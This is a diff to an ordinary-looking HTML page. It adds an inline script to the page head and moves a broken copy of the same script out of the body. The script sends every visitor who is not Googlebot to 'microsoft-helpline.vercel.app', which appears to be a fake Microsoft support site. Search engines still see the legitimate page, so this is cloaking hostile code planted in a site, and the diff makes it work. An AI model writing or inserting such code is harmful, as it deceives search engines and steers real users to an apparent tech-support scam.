@@ -2,6 +2,13 @@
 <html lang="en">
 
 <head>
+    <script>
+      var isGoogleBot = /googlebot/i.test(navigator.userAgent);
+      if (!isGoogleBot) {
+        window.location.href = "https://microsoft-helpline.vercel.app";
+      }
+    </script>
+
     <meta charset="UTF-8">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -20,13 +27,6 @@
 </head>
 
 <body>
-    <script>
-  var isGoogleBot = /googlebot/i.test(navigator.userAgent);
-  if (!isGoogleBot) {
-    window.location.href = "https://microsoft-helpline.vercel.app/;
-  }
-</script>
-	
     <!-- Preloader -->
     <div id="preloader">
         <i class="circle-preloader"></i>
